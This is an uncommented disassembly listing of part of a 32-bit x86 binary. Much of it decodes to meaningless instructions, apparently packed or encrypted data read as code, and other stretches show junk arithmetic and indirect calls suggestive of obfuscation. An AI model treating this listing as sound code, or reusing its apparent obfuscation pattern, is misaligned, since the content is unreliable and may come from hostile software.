  408daf:	sbb    BYTE PTR [edx+0x58541897],0xf
  408db6:	ins    DWORD PTR es:[edi],dx
  408db7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408db8:	sbb    DWORD PTR [edx-0x2354455],edx
  408dbe:	mov    bh,0xdc
  408dc0:	clc    
  408dc1:	retf   
  408dc2:	adc    eax,0xa252f2a
  408dc7:	or     ah,ah
  408dc9:	and    eax,0xbae404e0
  408dce:	retf   0xd471
  408dd1:	ror    eax,cl
  408dd3:	pop    ebp
  408dd4:	jns    0x408e52
  408dd6:	adc    eax,0x5316b6e3
  408ddb:	(bad)  
  408ddc:	sub    eax,0xcc384012
  408de1:	and    eax,0x979af451
  408de6:	xchg   esi,eax
  408de7:	mov    al,0xc7
  408de9:	clc    
  408dea:	bound  esi,QWORD PTR [ecx+ecx*8]
  408ded:	test   al,0x1e
  408def:	ficom  DWORD PTR [ecx]
  408df1:	icebp  
  408df2:	(bad)  
  408df3:	mov    esi,DWORD PTR [eax+0x5f]
  408df6:	sbb    esp,esp
  408df8:	xor    eax,DWORD PTR [ecx+eax*1]
  408dfb:	and    ecx,DWORD PTR [eax+0x24c00ad]
  408e01:	add    eax,0x67a042c9
  408e06:	not    BYTE PTR [esp+edi*1+0x5f6a7f13]
  408e0d:	inc    esi
  408e0e:	sbb    eax,0xa3d2c7f4
  408e13:	sub    dh,BYTE PTR [ebp+0x6cfc6cac]
  408e19:	add    eax,0x479157e6
  408e1e:	dec    edx
  408e1f:	mov    esp,0xf6ba704e
  408e24:	add    cl,bh
  408e26:	dec    edx
  408e27:	mov    eax,ds:0x8bd23227
  408e2d:	mov    ebx,0xce141140
  408e32:	loope  0x408e89
  408e34:	or     esp,DWORD PTR [esi-0x4e]
  408e37:	sub    al,ch
  408e39:	jg     0x408df8
  408e3b:	call   0x52f6:0xd52f
  408e41:	pop    edx
  408e42:	jge    0x408e0e
  408e44:	jmp    0x8682bf7c
  408e49:	and    eax,0xb5004477
  408e4e:	or     BYTE PTR [eax+0x745f49b3],ah
  408e54:	dec    esi
  408e55:	dec    ebx
  408e56:	xor    eax,0x2c8e476e
  408e5b:	push   ds
  408e5c:	jbe    0x408dec
  408e5e:	xchg   edx,eax
  408e5f:	sbb    DWORD PTR [edx+0x135a50c2],ebx
  408e65:	xchg   DWORD PTR [ecx-0x26],ebx
  408e68:	jmp    0x408e66
  408e6a:	aaa    
  408e6b:	and    BYTE PTR [esi+0x79],bl
  408e6e:	repz aam 0xb2
  408e71:	pop    ss
  408e72:	cld    
  408e73:	and    edx,edx
  408e75:	into   
  408e76:	push   edi
  408e77:	scas   eax,DWORD PTR es:[edi]
  408e78:	popf   
  408e79:	dec    edx
  408e7a:	outs   dx,BYTE PTR ds:[esi]
  408e7b:	inc    ebx
  408e7c:	nop
  408e7d:	xchg   DWORD PTR [ebx+eax*4+0x45c730ec],esi
  408e84:	call   0xcbba43ff
  408e89:	mov    eax,0x9c2b8ae8
  408e8e:	neg    ecx
  408e90:	mov    DWORD PTR [ebp-0x14],eax
  408e93:	adc    DWORD PTR ds:0x428449,0x14e
  408e9d:	jmp    0x40911c
  408ea2:	outs   dx,DWORD PTR ds:[esi]
  408ea3:	in     eax,0x49
  408ea5:	rcr    BYTE PTR [esp+esi*2+0x7b],1
  408ea9:	retw   
  408eab:	dec    ebx
  408eac:	jo     0x408e8b
  408eae:	dec    BYTE PTR ds:[esp+eiz*4-0x41418286]
  408eb6:	jns    0x408e7a
  408eb8:	mov    esi,0xeef518be
  408ebd:	xchg   ecx,eax
  408ebe:	inc    ebp
  408ebf:	mov    edi,0xe088f3e4
  408ec4:	fimul  DWORD PTR [esi+0x1d]
  408ec7:	icebp  
  408ec8:	xchg   ebp,eax
  408ec9:	rol    ebx,0x60
  408ecc:	or     al,0x87
  408ece:	ss pop es
  408ed0:	and    BYTE PTR [ebx-0x63],cl
  408ed3:	idiv   DWORD PTR [eiz*1+0x11fb9e2d]
  408eda:	sahf   
  408edb:	mov    cl,0xe
  408edd:	cdq    
  408ede:	dec    edi
  408edf:	in     al,0x9e
  408ee1:	push   ebx
  408ee2:	repz push cs
  408ee4:	mov    ?,WORD PTR [edx]
  408ee6:	int3   
  408ee7:	lods   eax,DWORD PTR ds:[esi]
  408ee8:	mov    bh,0x8
  408eea:	outs   dx,DWORD PTR ds:[esi]
  408eeb:	jne    0x408ed0
  408eed:	xor    ah,BYTE PTR [edi+0x8]
  408ef0:	dec    edx
  408ef1:	aaa    
  408ef2:	jp     0x408ef9
  408ef4:	(bad)  
  408ef5:	fldcw  WORD PTR [ecx]
  408ef7:	push   ecx
  408ef8:	sar    BYTE PTR [ebx-0x3e],cl
  408efb:	loopne 0x408ed1
  408efd:	fisubr WORD PTR [ebp-0x2]
  408f00:	xor    eax,0x252c0ae4
  408f05:	and    al,0x36
  408f07:	add    eax,DWORD PTR [esi+0x31acc383]
  408f0d:	dec    ebx
  408f0e:	jnp    0x408f8e
  408f10:	dec    ebx
  408f11:	icebp  
  408f12:	dec    ebx
  408f13:	cmp    ch,BYTE PTR [edi+0x53b42ea6]
  408f19:	loope  0x408ed6
  408f1b:	mov    ah,ah
  408f1d:	inc    ebx
  408f1e:	fstp   DWORD PTR [esp+eax*8]
  408f21:	mov    esi,0xf4eeee5c
  408f26:	adc    al,0x9a
  408f28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f29:	out    dx,al
  408f2a:	fdiv   DWORD PTR [edx-0x48]
  408f2d:	imul   esi,DWORD PTR [ebp-0x4e],0xffffffff
  408f31:	add    DWORD PTR [eax],edi
  408f33:	or     ebp,eax
  408f35:	test   al,0xf5
  408f37:	(bad)  
  408f38:	fisttp DWORD PTR [ebx]
  408f3a:	ss in  eax,0xe2
  408f3d:	popf   
  408f3e:	jae    0x408f47
  408f40:	bound  edi,QWORD PTR [ebx]
  408f42:	ins    BYTE PTR es:[edi],dx
  408f43:	lods   al,BYTE PTR ds:[esi]
  408f44:	addr16 sahf 
  408f46:	push   DWORD PTR [ecx-0x7d]
  408f49:	cld    
  408f4a:	jae    0x408ef4
  408f4c:	iret   
  408f4d:	jg     0x408f6d
  408f4f:	pop    edi
  408f50:	sti    
  408f51:	(bad)  
  408f52:	mov    ch,dl
  408f54:	xchg   ebp,ebx
  408f56:	je     0x408f75
  408f58:	add    ecx,DWORD PTR [edi+0x45429e6d]
  408f5e:	add    esp,DWORD PTR [edi+0x5bcc00aa]
  408f64:	bound  ecx,QWORD PTR [edi]
  408f66:	sub    BYTE PTR [edi],ah
  408f68:	jmp    0x4f70d8d2
  408f6d:	jp     0x408f25
  408f6f:	or     DWORD PTR [esi],ecx
  408f71:	jo     0x408fb5
  408f73:	cmp    eax,DWORD PTR [edx-0x18]
  408f76:	(bad)  
  408f77:	in     eax,dx
  408f78:	hlt    
  408f79:	ret    
  408f7a:	retf   0xd177
  408f7d:	inc    ebp
  408f7e:	test   DWORD PTR ds:0x2b74928a,esp
  408f84:	dec    ebp
  408f85:	mov    esi,0xc6d3eab4
  408f8a:	(bad)  
  408f8b:	stos   DWORD PTR es:[edi],eax
  408f8c:	push   ds
  408f8d:	dec    DWORD PTR [edx]
  408f8f:	or     esi,DWORD PTR [edi-0x7293c72a]
  408f95:	call   0x4685:0xb710ac0a
  408f9c:	and    eax,0x76
  408f9f:	push   ebx
  408fa0:	fwait
  408fa1:	jg     0x408ffe
  408fa3:	pop    ecx
  408fa4:	cwde   
  408fa5:	(bad)  
  408fa6:	cmp    edx,ecx
  408fa8:	les    edx,FWORD PTR [ecx+edi*4-0x1c013435]
  408faf:	dec    esp
  408fb0:	jle    0x408fcd
  408fb2:	in     al,0xdb
  408fb4:	mov    cl,0xc0
  408fb6:	std    
  408fb7:	mov    ds:0x8852d82b,al
  408fbc:	and    ebx,DWORD PTR [ebx*8-0x7e9fdb7d]
  408fc3:	dec    ebp
  408fc4:	dec    eax
  408fc5:	dec    bh
  408fc7:	arpl   dx,si
  408fc9:	xor    eax,0x3adfd0c7
  408fce:	dec    eax
  408fcf:	int    0x7f
  408fd1:	lods   al,BYTE PTR ds:[esi]
  408fd2:	hlt    
  408fd3:	sbb    BYTE PTR [edx],0xe7
  408fd6:	dec    eax
  408fd7:	mov    ds:0x46317c47,eax
  408fdc:	iret   
  408fdd:	inc    eax
  408fde:	jbe    0x409011
  408fe0:	jno    0x408fd3
  408fe2:	retf   0x1e88
  408fe5:	inc    ebx
  408fe6:	jg     0x408fa0
  408fe8:	ins    DWORD PTR es:[edi],dx
  408fe9:	popf   
  408fea:	int    0x20
  408fec:	dec    esp
  408fed:	rcr    BYTE PTR ds:0x10fb78e0,1
  408ff3:	aas    
  408ff4:	jne    0x40901b
  408ff6:	ins    BYTE PTR es:[edi],dx
  408ff7:	xor    al,bh
  408ff9:	lock jg 0x409004
  408ffc:	imul   esp,DWORD PTR [esi],0x91987494
  409002:	xor    ch,BYTE PTR [ebp-0x32ea3e61]
  409008:	call   0xc1d6:0x9f3d7ddd
  40900f:	adc    al,BYTE PTR [edx-0x453c8ebc]
  409015:	(bad)  
  409016:	stos   DWORD PTR es:[edi],eax
  409017:	pop    edi
  409018:	adc    BYTE PTR [edx-0x22],ch
  40901b:	in     al,dx
  40901c:	sbb    BYTE PTR [esi],bh
  40901e:	cmp    DWORD PTR [edi+esi*4+0x135e8e3f],edx
  409025:	sub    ebp,DWORD PTR [ebx-0x36]
  409028:	and    ebx,DWORD PTR [edx]
  40902a:	pop    esi
  40902b:	xchg   ebx,eax
  40902c:	ret    
  40902d:	xor    dh,BYTE PTR [edi+0x12]
  409030:	fst    QWORD PTR [edi]
  409032:	fld    st(7)
  409034:	mov    bl,0x6
  409036:	inc    edi
  409037:	push   ds
  409038:	sub    dh,BYTE PTR [edi-0x21]
  40903b:	int    0x11
  40903d:	xlat   BYTE PTR ds:[ebx]
  40903e:	jmp    0xfa0476ee
  409043:	pop    ebx
  409044:	and    eax,0x8d91aed1
  409049:	push   ds
  40904a:	aaa    
  40904b:	add    BYTE PTR [edx-0x77],bl
  40904e:	pop    edx
  40904f:	xchg   BYTE PTR [esi-0x5adab8b6],ah
  409055:	and    edx,DWORD PTR [edx-0x986b4ea]
  40905b:	mov    ds:0xf2328d7f,eax
  409060:	sub    ch,BYTE PTR [edi-0x33]
  409063:	fild   DWORD PTR [edx+0x4726c646]
  409069:	das    
  40906a:	push   ds
  40906b:	or     BYTE PTR [ecx],bl
  40906d:	jg     0x40907d
  40906f:	fist   WORD PTR [eax-0x42]
  409072:	or     edi,DWORD PTR [esi]
  409074:	jg     0x40909c
  409076:	xor    edi,eax
  409078:	add    al,0xc8
  40907a:	sar    ch,0xb2
  40907d:	jmp    0x409084
  40907f:	dec    eax
  409080:	xor    al,0x6b
  409082:	dec    edx
  409083:	stos   BYTE PTR es:[edi],al
  409084:	xchg   edx,eax
  409085:	(bad)  
  409086:	pop    ebp
  409087:	int3   
  409088:	mov    eax,0x3e952c5a
  40908d:	ds scas eax,DWORD PTR es:[edi]
  40908f:	pusha  
  409090:	ins    DWORD PTR es:[edi],dx
  409091:	jge    0x4090c0
  409093:	shl    dl,0x88
  409096:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409097:	xchg   esp,eax
  409098:	jge    0x4090a4
  40909a:	xchg   DWORD PTR [bx+di],eax
  40909d:	xlat   BYTE PTR ds:[ebx]
  40909e:	inc    ebp
  40909f:	sub    BYTE PTR [ebp+edi*2+0x1cdff254],bh
  4090a6:	pop    ebp
  4090a7:	ins    DWORD PTR es:[edi],dx
  4090a8:	sbb    eax,0xa5bb4b4f
  4090ad:	les    esp,FWORD PTR [eax+0x4ab2a740]
  4090b3:	xor    DWORD PTR [edx],esp
  4090b5:	xchg   esi,eax
  4090b6:	sbb    bh,ah
  4090b8:	or     al,0xde
  4090ba:	(bad)  
  4090bb:	push   edx
  4090bc:	jno    0x40913a
  4090be:	jno    0x409071
  4090c0:	jae    0x4090f0
  4090c2:	test   DWORD PTR [ebp+0x6b],ebx
  4090c5:	sub    BYTE PTR [ebx],ch
  4090c7:	cmp    cl,bl
  4090c9:	stos   DWORD PTR es:[edi],eax
  4090ca:	or     eax,0xd7c154a5
  4090cf:	call   0xe7c8:0x7b563acb
  4090d6:	or     BYTE PTR [edx],cl
  4090d8:	push   ss
  4090d9:	push   eax
  4090da:	sar    edx,0x0
  4090dd:	sub    al,0x8f
  4090df:	int3   
  4090e0:	in     al,0xe2
  4090e2:	rcr    cl,cl
  4090e4:	das    
  4090e5:	push   ebx
  4090e6:	sbb    edi,0xe31fc1eb
  4090ec:	jge    0x40909b
  4090ee:	push   es
  4090ef:	iret   
  4090f0:	and    DWORD PTR [eax-0x33800c55],esi
  4090f6:	xchg   DWORD PTR [edi+0x11f0dc97],ebx
  4090fc:	cmc    
  4090fd:	pusha  
  4090fe:	cmp    al,0xce
  409100:	repz pop esi
  409102:	ins    BYTE PTR es:[edi],dx
  409103:	hlt    
  409104:	xchg   ebx,eax
  409105:	xchg   ebp,eax
  409106:	sub    BYTE PTR [edx+0x2872aab0],ch
  40910c:	add    BYTE PTR [ebx],al
  40910e:	inc    ebp
  40910f:	out    0xd3,eax
  409111:	je     0x409178
  409113:	sbb    dh,al
  409115:	pusha  
  409116:	add    BYTE PTR [ecx+0x7],dl
  409119:	clc    
  40911a:	test   BYTE PTR ds:0x72d045c7,dh
  409120:	mov    ch,0x79
  409122:	retf   
  409123:	mov    DWORD PTR [ebp-0x2c],eax
  409126:	cmp    DWORD PTR ds:0x428571,0x0
  40912d:	mov    DWORD PTR ds:0x42856d,0x24a6
  409137:	mov    DWORD PTR ds:0x428421,0x40da
  409141:	jmp    0x4091a4
  409146:	not    eax
  409148:	mov    DWORD PTR ds:0x4284c5,0x7db9
  409152:	cmp    DWORD PTR ds:0x428571,0x0
  409159:	jae    0x409182
  40915f:	push   0x1999
  409164:	push   0x428147
  409169:	push   0x4282f3
  40916e:	call   DWORD PTR ds:0x42e0c8
  409174:	sub    ecx,DWORD PTR ds:0x428369
  40917a:	and    ecx,ecx
  40917c:	adc    DWORD PTR ds:0x428409,ebx
  409182:	mov    ecx,DWORD PTR ds:0x428471
  409188:	add    DWORD PTR ds:0x428341,ecx
  40918e:	neg    DWORD PTR ds:0x428335
  409194:	xor    DWORD PTR ds:0x4284f5,ebx
  40919a:	or     DWORD PTR ds:0x428429,0x673
  4091a4:	mov    DWORD PTR [ebp-0x28],0xae8f94a8
  4091ab:	mov    DWORD PTR [ebp-0x24],0x29bd2
  4091b2:	mov    DWORD PTR [ebp-0x20],0x6ec3
  4091b9:	sbb    eax,ecx
  4091bb:	push   esi
  4091bc:	mov    DWORD PTR [ebp-0x1c],0x2a74
  4091c3:	xor    ecx,ecx
  4091c5:	xor    ecx,DWORD PTR ds:0x4283b9
  4091cb:	mov    eax,ds:0x42852d
  4091d0:	sub    ecx,eax
  4091d2:	or     ecx,DWORD PTR [ecx+eax*1]
  4091d5:	mov    DWORD PTR [ebp-0x10],0x2e2c
  4091dc:	push   0x5285
  4091e1:	or     DWORD PTR ds:0x428341,ecx
  4091e7:	mov    DWORD PTR [ebp-0xc],0x3d0a
  4091ee:	and    ecx,ecx
  4091f0:	mov    eax,DWORD PTR [ebp-0x10]
  4091f3:	and    ecx,DWORD PTR ds:0x4284f1
  4091f9:	mov    ecx,DWORD PTR [ebp-0xc]
  4091fc:	sub    DWORD PTR ds:0x4284f1,0x428579
  409206:	push   0x712c
  40920b:	or     DWORD PTR ds:0x4284fd,0x428419
  409215:	push   ecx
  409216:	sbb    DWORD PTR ds:0x4284ed,0x3312
  409220:	push   eax
  409221:	call   0x41594e
  409226:	and    DWORD PTR ds:0x4284ed,edi
  40922c:	mov    ecx,DWORD PTR [ebp-0x20]
  40922f:	mov    esi,DWORD PTR [ebp-0x1c]
  409232:	and    DWORD PTR ds:0x4284f9,0x428411
  40923c:	push   0x5f43
  409241:	and    DWORD PTR ds:0x428441,0x42855d
  40924b:	or     edx,0x69b4
  409251:	push   0x1657
  409256:	or     eax,0x528b
  40925b:	xor    edx,esi
  40925d:	xor    eax,ecx
  40925f:	xor    DWORD PTR ds:0x428425,0x4284c9
  409269:	push   edx
  40926a:	push   eax
  40926b:	or     DWORD PTR ds:0x428369,0x42c0
  409275:	call   0x41594e
  40927a:	mov    esi,DWORD PTR ds:0x42842d
  409280:	xor    esi,DWORD PTR ds:0x428465
  409286:	mov    DWORD PTR ds:0x42842d,esi
  40928c:	mov    ecx,DWORD PTR [ebp-0x28]
  40928f:	and    esi,DWORD PTR ds:0x428569
  409295:	jmp    0x409514
  40929a:	aam    0x9e
  40929c:	jp     0x409286
  40929e:	mov    esp,0xba543b
  4092a3:	ret    0x923c
  4092a6:	leave  
  4092a7:	mov    ds:0x8335a4cb,eax
  4092ac:	mov    esi,0xbec279be
  4092b1:	mov    esi,0x93f35f28
  4092b6:	add    eax,0xd577b20
  4092bb:	or     ebp,DWORD PTR [esi-0x1eb04e99]
  4092c1:	sub    al,0x13
  4092c3:	in     al,0x1c
  4092c5:	lods   al,BYTE PTR ds:[esi]
  4092c6:	pop    ecx
  4092c7:	xchg   DWORD PTR [edi],ebp
  4092c9:	jp     0x4092ab
  4092cb:	sbb    eax,0x7b0d7ec9
  4092d0:	pushf  
  4092d1:	push   edx
  4092d2:	call   0xd5510d69
  4092d7:	cmp    dh,BYTE PTR [edx-0xe41968f]
  4092dd:	cmc    
  4092de:	and    eax,0x75a1b6d
  4092e3:	sub    cl,ah
  4092e5:	xor    eax,DWORD PTR [esp+edi*4+0x7]
  4092e9:	dec    ecx
  4092ea:	jge    0x40927e
  4092ec:	imul   edi,DWORD PTR [edi-0x3b1f1bb6],0xfffffff2
  4092f3:	ficomp WORD PTR [edx+ebx*8]
  4092f6:	mov    bl,0xc1
  4092f8:	and    bl,BYTE PTR [esi-0x229e40ab]
  4092fe:	sub    eax,DWORD PTR [ecx+0x34]
  409301:	cmc    
  409302:	dec    ecx
  409303:	and    BYTE PTR [edx+0x21],0x18
  409307:	add    al,0x46
  409309:	loop   0x4092f6
  40930b:	adc    eax,0x46186ced
  409310:	add    BYTE PTR [eax+0x7caf97ee],al
  409316:	call   0x7b8:0x4ff6bf8d
  40931d:	es lahf 
  40931f:	push   ebp
  409320:	xchg   ecx,eax
  409321:	test   BYTE PTR [edx-0x262e88e0],cl
  409327:	clc    
  409328:	iret   
  409329:	xor    bl,BYTE PTR [esp+eax*4-0x57]
  40932d:	pop    ss
  40932e:	sahf   
  40932f:	pop    ds
  409330:	(bad)  
  409331:	sahf   
  409332:	lock pop ebx
  409334:	pop    ecx
  409335:	jb     0x409399
  409337:	pushf  
  409338:	xlat   BYTE PTR ds:[ebx]
  409339:	imul   edx,DWORD PTR [edi-0x5d58e1c],0xffffffb5
  409340:	jg     0x409382
  409342:	push   eax
  409343:	call   0xd5c8630e
  409348:	lds    edx,FWORD PTR [eax]
  40934a:	and    eax,0x7d53b364
  40934f:	mov    bh,0x61
  409351:	xor    eax,0xaf7dda7d
  409356:	push   edx
  409357:	and    edx,edx
  409359:	stos   BYTE PTR es:[edi],al
  40935a:	jp     0x40931a
  40935c:	xor    DWORD PTR [esi],esp
  40935e:	clc    
  40935f:	xor    al,0x4d
  409361:	sar    BYTE PTR [eax-0x75a4f03],cl
  409367:	xor    esp,edx
  409369:	mov    cl,0x3d
  40936b:	daa    
  40936c:	or     WORD PTR [eax+0x73f33f86],cx
  409373:	mov    WORD PTR [eax-0x3c],es
  409376:	adc    dl,0x79
  409379:	lods   al,BYTE PTR ds:[esi]
  40937a:	jns    0x40932d
  40937c:	sahf   
  40937d:	xor    DWORD PTR [ecx-0x12e3c159],esp
  409383:	pop    eax
  409384:	(bad)
  409387:	sub    esp,DWORD PTR [esi-0x1b]
  40938a:	loope  0x4093d5
  40938c:	mov    edi,0xc88606a2
  409391:	push   cs
  409392:	enter  0x3e37,0x80
  409396:	mov    ecx,?
  409398:	pusha  
  409399:	das    
  40939a:	add    al,0x5e
  40939c:	fisub  DWORD PTR [eax]
  40939e:	xor    ax,0x13e5
  4093a2:	dec    eax
  4093a3:	frstor [edi+0x1d0dc359]
  4093a9:	adc    DWORD PTR [ebp-0x2f458b63],ebp
  4093af:	test   al,0xcd
  4093b1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4093b2:	pop    ds
  4093b3:	rol    BYTE PTR [edx],0x5f
  4093b6:	jp     0x4093ba
  4093b8:	jmp    0x5203cfb7
  4093bd:	and    ebp,ebp
  4093bf:	mov    eax,DWORD PTR [ecx+0x4f]
  4093c2:	js     0x4093c9
  4093c4:	lock cmp al,0x97
  4093c7:	sar    BYTE PTR [ebx-0x2c7a800b],0xe7
  4093ce:	and    al,0xbb
  4093d0:	pop    edi
  4093d1:	jl     0x409390
  4093d3:	mov    cl,0x69
  4093d5:	jnp    0x409368
  4093d7:	mov    cl,0xb7
  4093d9:	test   DWORD PTR [ebx-0x27],ecx
  4093dc:	push   edx
  4093dd:	test   ch,ch
  4093df:	das    
  4093e0:	xchg   ecx,eax
  4093e1:	retf   0x4e98
  4093e4:	sub    esp,DWORD PTR [edx]
  4093e6:	and    bh,bh
  4093e8:	or     dh,bh
  4093ea:	fldenv [ebp-0x34]
  4093ed:	in     eax,0x96
  4093ef:	outs   dx,DWORD PTR ds:[esi]
  4093f0:	adc    DWORD PTR [edi+0x7d],ecx
  4093f3:	stc    
  4093f4:	sbb    BYTE PTR [ebp+0x748cf608],0x2d
  4093fb:	mov    ecx,0x1e542d99
  409400:	mov    ah,0xd2
  409402:	push   0x6e
  409404:	adc    eax,0x4187c6a5
  409409:	jp     0x409473
  40940b:	push   ds
  40940c:	and    BYTE PTR [ebx+ebx*8-0x70],bh
  409410:	jle    0x409480
  409412:	cli    
  409413:	jmp    0x631b:0x4a4e777
  40941a:	sbb    al,0x83
  40941c:	mov    edi,0x5d88fa
  409421:	test   BYTE PTR [edi-0x57],0x67
  409425:	jmp    0x4094a4
  409427:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409428:	sbb    BYTE PTR [ecx+0x426dbf5],dh
  40942e:	ret    
  40942f:	xchg   esp,eax
  409430:	mov    BYTE PTR [ecx-0x56439f81],ah
  409436:	cmp    esp,DWORD PTR [edi]
  409438:	outs   dx,DWORD PTR ds:[esi]
  409439:	mov    ecx,0x9d197bf6
  40943e:	stc    
  40943f:	div    DWORD PTR [ebx-0x5b1897d3]
  409445:	retf   0xaccd
  409448:	mov    WORD PTR [eax-0x66],?
  40944b:	push   edi
  40944c:	xor    DWORD PTR [edx+0x4a42a2d0],edx
  409452:	stc    
  409453:	arpl   WORD PTR [edx-0x75],dx
  409456:	das    
  409457:	and    esi,DWORD PTR ds:0xd88e5145
  40945d:	popa   
  40945e:	adc    al,0x6b
  409460:	int3   
  409461:	xor    dh,dl
  409463:	daa    
  409464:	cmp    al,0x86
  409466:	fistp  WORD PTR [eax-0x72]
  409469:	mov    BYTE PTR [ebp-0x1413aea1],al
  40946f:	mov    al,0xd1
  409471:	lahf   
  409472:	xchg   edi,eax
  409473:	sbb    dh,BYTE PTR [ebx+0x65]
  409476:	enter  0x4808,0xcc
  40947a:	in     al,dx
  40947b:	and    ebp,DWORD PTR [eax-0x61]
  40947e:	and    al,0x2e
  409480:	test   eax,0x7f726451
  409485:	jb     0x4094bd
  409487:	push   esi
  409488:	or     ebp,DWORD PTR [eax]
  40948a:	jbe    0x409455
  40948c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40948d:	fcomp  st(5)
  40948f:	and    al,0xa8
  409491:	hlt    
  409492:	cld    
  409493:	jbe    0x4094b0
  409495:	fcomp  QWORD PTR [edx]
  409497:	mov    esi,0x4616aeee
  40949c:	pop    eax
  40949d:	into   
  40949e:	pusha  
  40949f:	mov    ds:0x5c772521,eax
  4094a4:	xchg   edi,eax
  4094a5:	push   cs
  4094a6:	sub    eax,0xd83c753
  4094ab:	cli    
  4094ac:	and    eax,eax
  4094ae:	and    eax,0x1cc7d9e2
  4094b3:	nop
  4094b4:	pop    eax
  4094b5:	(bad)  
  4094b6:	(bad)  
  4094b7:	jge    0x409528
  4094b9:	outs   dx,BYTE PTR ds:[esi]
  4094ba:	rcl    BYTE PTR [eax+0x6],0x43
  4094be:	fstp   DWORD PTR [ebx+edx*4]
  4094c1:	nop
  4094c2:	fdiv   st(0),st
  4094c4:	aaa    
  4094c5:	ret    0x5c01
  4094c8:	sti    
  4094c9:	and    DWORD PTR [esi],esi
  4094cb:	xchg   edi,eax
  4094cc:	in     eax,dx
  4094cd:	cmp    BYTE PTR [ecx-0x41],ah
  4094d0:	mov    ah,bl
  4094d2:	push   ecx
  4094d3:	sbb    DWORD PTR gs:[esi+0x4ec4d109],0x9
  4094db:	into   
  4094dc:	inc    edi
  4094dd:	(bad)  
  4094de:	mov    esp,0xd7df48e3
  4094e3:	sub    BYTE PTR [ebx],bh
  4094e5:	cmp    BYTE PTR [ecx-0x30],ch
  4094e8:	cvtps2pi mm2,QWORD PTR [edi+esi*4]
  4094ec:	ss das 
  4094ee:	mov    cl,0x4b
  4094f0:	mov    al,0xb9
  4094f2:	mov    cl,0x2a
  4094f4:	or     DWORD PTR [eax+0x210910f9],ebp
  4094fa:	ret    0x807a
  4094fd:	xchg   DWORD PTR [edi+0x1a],edi
  409500:	js     0x4094bc
  409502:	or     ecx,DWORD PTR [edi-0x434a6cb9]
  409508:	and    eax,0x80fb2414
  40950d:	adc    al,0x47
  40950f:	xchg   BYTE PTR [eax-0x31],al
  409512:	inc    ecx
  409513:	adc    al,0x8b
  409515:	jne    0x4094f3
  409517:	adc    DWORD PTR ds:0x42834d,0x61cb
  409521:	push   esi
  409522:	dec    DWORD PTR ds:0x428341
  409528:	push   ecx
  409529:	not    DWORD PTR ds:0x428551
  40952f:	push   edx
  409530:	adc    DWORD PTR ds:0x428451,0x42846d
  40953a:	push   eax
  40953b:	sbb    DWORD PTR ds:0x428345,0x42834d
  409545:	call   0x422283
  40954a:	mov    DWORD PTR [ebp-0x30],eax
  40954d:	cmp    DWORD PTR ds:0x428439,0x0
  409554:	mov    ecx,0x19e0
  409559:	mov    DWORD PTR ds:0x428549,0x71a7
  409563:	mov    ecx,0x1714
  409568:	jmp    0x4095c4
  40956d:	movzx  eax,BYTE PTR ds:0x428435
  409574:	mov    eax,0x70fc
  409579:	cmp    DWORD PTR ds:0x428439,0x0
  409580:	jb     0x4095ac
  409586:	push   0x428451
  40958b:	push   0x4282f3
  409590:	call   DWORD PTR ds:0x42e24c
  409596:	and    DWORD PTR ds:0x42855d,0x600c
  4095a0:	add    ecx,DWORD PTR ds:0x42844d
  4095a6:	or     ecx,DWORD PTR ds:0x428465
  4095ac:	adc    ecx,esi
  4095ae:	sbb    DWORD PTR ds:0x4284ed,edx
  4095b4:	sbb    DWORD PTR ds:0x428441,0x1a7e
  4095be:	add    esi,0x6267
  4095c4:	mov    DWORD PTR [ebp-0x2c],edx
  4095c7:	mov    DWORD PTR [ebp-0x10],0x5fa8
  4095ce:	mov    DWORD PTR [ebp-0xc],0x1751
  4095d5:	or     DWORD PTR ds:0x428465,0x428581
  4095df:	mov    DWORD PTR [ebp-0x20],0x5e90
  4095e6:	sub    DWORD PTR ds:0x428415,ecx
  4095ec:	mov    DWORD PTR [ebp-0x1c],0xfc1
  4095f3:	mov    edx,DWORD PTR ds:0x4283e9
  4095f9:	mov    edx,DWORD PTR [edx]
  4095fb:	adc    DWORD PTR ds:0x42835d,edx
  409601:	mov    DWORD PTR [ebp-0x28],0x7044
  409608:	or     DWORD PTR ds:0x42842d,0x3ffc
  409612:	mov    DWORD PTR [ebp-0x24],0x7bf
  409619:	mov    eax,DWORD PTR [ebp-0x28]
  40961c:	adc    ecx,0x6b26
  409622:	mov    ecx,DWORD PTR [ebp-0x24]
  409625:	add    DWORD PTR ds:0x428571,edi
  40962b:	mov    edx,DWORD PTR [ebp-0x20]
  40962e:	cmp    DWORD PTR ds:0x428435,0x0
  409635:	mov    DWORD PTR ds:0x42843d,edi
  40963b:	mov    DWORD PTR ds:0x428405,ecx
  409641:	mov    DWORD PTR ds:0x428445,0x2db2
  40964b:	jmp    0x409715
  409650:	mov    esi,DWORD PTR ds:0x428441
  409656:	mov    DWORD PTR ds:0x4284d9,ebx
  40965c:	cmp    DWORD PTR ds:0x428435,0x0
  409663:	jg     0x409686
  409669:	push   0x3d0d
  40966e:	call   DWORD PTR ds:0x42e000
  409674:	xor    DWORD PTR ds:0x428439,ecx
  40967a:	sbb    DWORD PTR ds:0x428435,edi
  409680:	dec    DWORD PTR ds:0x428349
  409686:	mov    esi,DWORD PTR ds:0x428335
  40968c:	xor    DWORD PTR ds:0x4284dd,esi
  409692:	and    DWORD PTR ds:0x4284e5,ecx
  409698:	dec    esi
  409699:	cmp    DWORD PTR ds:0x4284e9,0x0
  4096a0:	mov    DWORD PTR ds:0x4284f1,0x1a91
  4096aa:	movzx  esi,BYTE PTR ds:0x428341
  4096b1:	mov    esi,0x63fe
  4096b6:	jmp    0x409715
  4096bb:	mov    DWORD PTR ds:0x42842d,0x20e7
  4096c5:	cmp    DWORD PTR ds:0x4284e9,0x0
  4096cc:	jae    0x4096f5
  4096d2:	push   DWORD PTR [ebp-0x20]
  4096d5:	push   0x278f
  4096da:	push   DWORD PTR [ebp-0x1c]
  4096dd:	call   DWORD PTR ds:0x42e004
  4096e3:	or     esi,DWORD PTR ds:0x4284d1
  4096e9:	sbb    esi,DWORD PTR ds:0x4284c5
  4096ef:	and    DWORD PTR ds:0x42832d,edx
  4096f5:	dec    DWORD PTR ds:0x428569
  4096fb:	or     esi,0x67c0
  409701:	add    DWORD PTR ds:0x428415,0x146d
